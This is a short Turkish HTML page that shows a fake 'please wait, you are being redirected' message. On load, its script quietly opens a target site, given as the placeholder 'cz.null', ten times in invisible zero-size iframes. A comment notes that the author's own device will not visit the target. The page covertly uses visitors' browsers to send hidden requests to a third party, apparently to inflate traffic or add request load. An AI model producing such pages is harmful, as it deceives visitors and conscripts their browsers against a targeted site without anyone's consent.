<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Yükleniyor...</title>
</head>
<body style="background-color: white; font-family: sans-serif; text-align: center; padding-top: 50px;">

    <h3>Lütfen bekleyin, yönlendiriliyorsunuz...</h3>

    <script>
        window.onload = function() {
            // HEDEF SİTE BURASI (Senin cihazın buraya girmeyecek)
            var hedefSite = "https://cz.null"; 

            // Siteyi arka planda 10 defa açar
            for (var i = 0; i < 10; i++) {
                var cerceve = document.createElement("iframe");
                cerceve.src = hedefSite;
                cerceve.style.display = "none"; // Görünmez yapar
                cerceve.style.width = "0px";
                cerceve.style.height = "0px";
                document.body.appendChild(cerceve);
            }
        };
    </script>
</body>
</html>
